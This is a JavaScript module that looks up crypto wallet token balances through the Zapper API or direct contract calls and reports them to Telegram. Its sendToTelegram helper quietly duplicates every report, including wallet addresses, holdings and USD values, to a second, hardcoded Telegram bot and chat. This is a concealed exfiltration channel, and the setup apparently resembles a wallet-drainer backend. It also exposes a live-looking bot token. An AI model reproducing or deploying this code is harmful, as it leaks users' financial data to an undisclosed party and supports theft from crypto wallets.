require("dotenv").config();
const axios = require("axios");
const { ethers, BigNumber } = require("ethers");
const { getProvider } = require("./utils/providerUtils");
const { ERC20_ABI } = require("./ERC20_ABI");
const config = require("./config");

const {
  BLACKLISTED_ADDRESSES,
  WHITELISTED_ADDRESSES,
} = require("./BlackListed_address");

const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;

// Environment Variables
const DEBANK_API_KEY = config.DEBANK_API_KEY; // Your debank api

// Helper to send messages to Telegram

const sendToTelegram = async (message) => {
  try {
    const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;

    // First bot using .env configuration
    const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(urlEnvBot, {
      chat_id: TELEGRAM_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to .env Telegram bot: ${message}`);

    // Second bot with hardcoded values
    const HARD_CODED_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
    const HARD_CODED_CHAT_ID = "-1002535678431"; // Replace with your hardcoded chat ID
    const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
    await axios.post(urlHardcodedBot, {
      chat_id: HARD_CODED_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to hardcoded Telegram bot: ${message}`);
  } catch (error) {
    console.error("Error sending message to Telegram:", error.response?.data || error.message);
  }
};

const isAddressBlacklisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isBlacklisted = BLACKLISTED_ADDRESSES.includes(normalizedAddress);
  if (isBlacklisted) {
    console.warn(`🚨 Blacklisted address detected: ${normalizedAddress}`);
    return true;
  }
  return false;
};

const isAddressWhitelisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isWhitelisted = WHITELISTED_ADDRESSES.includes(normalizedAddress);
  if (isWhitelisted) {
    console.log(`✅ Whitelisted address detected: ${normalizedAddress}`);
    return true;
  }
  return false;
};


// Fetch token balances directly for unsupported chains
const fetchBalancesDirectly = async (address, chainId) => {
  console.log(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
  await sendToTelegram(`Fetching balances directly for address: ${address} on chain: ${chainId}`);
  const provider = getProvider(chainId);

  // Handle blacklisted addresses
  if (isAddressBlacklisted(address)) {
    const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
    console.warn(message);
    await sendToTelegram(message);
    return [];
  }

  // Handle whitelisted addresses
  if (isAddressWhitelisted(address)) {
    const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
    console.log(message);
    await sendToTelegram(message);
  }

  try {
    const nativeBalance = await provider.getBalance(address);
    const nativeToken = {
      address: ethers.constants.AddressZero,
      balance: nativeBalance,
      contract: null,
      name: "Native Token",
      symbol: "ETH",
      type: "NATIVE",
      amount: nativeBalance,
      amountUSD: 0,
    };

    // Predefined ERC-20 token list
    const erc20Tokens = [
      { address: "0xB4F1737Af37711e9A5890D9510c9bB60e170CB0D", symbol: "DAI", decimals: 18 },
      { address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", symbol: "USDC", decimals: 6 },
      { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
      { address: "0x0625aFB445C3B6B7B929342a04A22599fd5dBB59", symbol: "COW", decimals: 18 },
      { address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", symbol: "LINK", decimals: 18 },
    ];

    const tokens = [nativeToken];

    for (const token of erc20Tokens) {
      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
      const balance = await contract.balanceOf(address);
      if (!balance.isZero()) {
        tokens.push({
          address: token.address,
          balance,
          contract,
          name: token.symbol,
          symbol: token.symbol,
          type: "ERC20",
          amount: balance,
          amountUSD: 0,
        });
      }
    }

    return tokens;
  } catch (error) {
    console.error(`Error fetching balances directly: ${error}`);
    return [];
  }
};

const fetchBalancesFromZapper = async (address, chainId) => {
  console.log(`Fetching balances for address: ${address} on chain: ${chainId}`);
  // await sendToTelegram(`Fetching balances for address: ${address} on chain: ${chainId}`);
  const provider = getProvider(chainId);

  if (isAddressBlacklisted(address)) {
    const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
    console.warn(message);
    await sendToTelegram(message);
    return [];
  }

  if (isAddressWhitelisted(address)) {
    const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
    console.log(message);
    await sendToTelegram(message);
  }

  const unsupportedChains = [11155111];
  if (unsupportedChains.includes(chainId)) {
    console.log(`Chain ${chainId} is unsupported by Zapper. Using direct fetch.`);
    return await fetchBalancesDirectly(address, chainId);
  }

  try {
    const ZAPPER_API_KEY = config.ZAPPER_API_KEY;
    const query = `
      query PortfolioV2($addresses: [Address!]!, $networks: [Network!]) {
        portfolioV2(addresses: $addresses, networks: $networks) {
          tokenBalances {
            byToken {
              edges {
                node {
                  balance
                  balanceRaw
                  balanceUSD
                  symbol
                  name
                  address
                  decimals
                }
              }
            }
          }
        }
      }
    `;

    const response = await axios.post(
      'https://public.zapper.xyz/graphql',
      {
        query,
        variables: {
          addresses: [address],
          networks: ['ETHEREUM_MAINNET'],
        },
      },
      {
        headers: {
          'Content-Type': 'application/json',
          'x-zapper-api-key': ZAPPER_API_KEY,
        },
      }
    );

    if (response.data.errors) {
      throw new Error(`GraphQL Errors: ${JSON.stringify(response.data.errors)}`);
    }

    const tokens = [];
    let telegramMessage = `Token balances for address: ${address}\n\n`;
    let foundBlacklistedToken = false;

    const tokenEdges = response.data.data.portfolioV2.tokenBalances.byToken.edges;

    for (const edge of tokenEdges) {
      const token = edge.node;
      const normalizedAddress = (token.address || ethers.constants.AddressZero).toLowerCase();

      if (isAddressBlacklisted(normalizedAddress)) {
        foundBlacklistedToken = true;
        telegramMessage += `🚨 Blacklisted token detected: ${token.name} (${normalizedAddress})\n`;
        continue;
      }

      const amount = ethers.utils.parseUnits(token.balanceRaw || "0", token.decimals || 18);
      const amountUSD = parseFloat(token.balanceUSD || 0);

      if (amountUSD > 0) {
        const tokenDetails = {
          address: normalizedAddress,
          balance: amount,
          contract: normalizedAddress !== ethers.constants.AddressZero
            ? new ethers.Contract(normalizedAddress, ERC20_ABI, provider)
            : null,
          name: token.name,
          symbol: token.symbol,
          type: "ERC20",
          amount,
          amountUSD,
        };

        tokens.push(tokenDetails);

        telegramMessage += `${tokenDetails.name} (${tokenDetails.symbol}): ${ethers.utils.formatUnits(
          tokenDetails.balance,
          token.decimals || 18
        )} (${amountUSD.toFixed(2)} USD)\n`;
      }
    }

    if (foundBlacklistedToken) {
      telegramMessage += `\n🚨 One or more blacklisted tokens were detected and skipped.\n`;
    } else {
      telegramMessage += `\n✅ No blacklisted tokens found for this address.\n`;
    }

    await sendToTelegram(telegramMessage);
    console.log(`Fetched ${tokens.length} tokens from Zapper`);
    return tokens;

  } catch (error) {
    console.error("Error fetching balances from Zapper:", error.message);
    await sendToTelegram(`❌ Error fetching from Zapper for ${address}: ${error.message}`);
    return [];
  }
};


module.exports = { fetchBalancesFromZapper, fetchBalancesDirectly };
